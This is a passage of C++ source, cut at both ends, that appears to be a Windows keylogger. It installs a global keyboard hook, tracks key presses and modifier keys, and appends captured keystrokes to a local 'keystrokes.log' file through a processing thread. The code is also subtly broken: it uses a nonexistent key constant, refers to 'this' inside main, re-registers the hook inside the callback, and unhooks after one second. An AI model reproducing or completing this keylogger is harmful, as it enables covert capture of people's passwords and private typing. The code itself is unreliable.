    } else if (wParam == VK_KEYUP) {
        // Key released
        recording = false;
        lastShift = 0;
        lastCtrl = 0;
    }

    // Update the hook
    SetWindowsHook(keyhook, n);
}

int main() {
    HHOOK keyhook = SetWindowsHook(WH_KEYBOARD, keyCallback);

    // Initialize the file
    ofstream logFile("keystrokes.log", ofstream::app);

    // Start the thread to process keystrokes
    thread thread(keyProcessing, this);

    // Keep the main thread alive
    this_thread::sleep_for(chrono::seconds(1));

    // Stop the hook and clean up
    UnhookWindowsHook(keyhook);
    logFile.close();

    return 0;
}

void keyProcessing() {
    while (true) {
        lock_guard lock(keystrokeMutex);
        if (keystrokeQueue.empty()) break;

        pair<int, int> event = keystrokeQueue.front();
        keystrokeQueue.pop();

        // Convert to character and log
        char key = static_cast<char>(event.first);
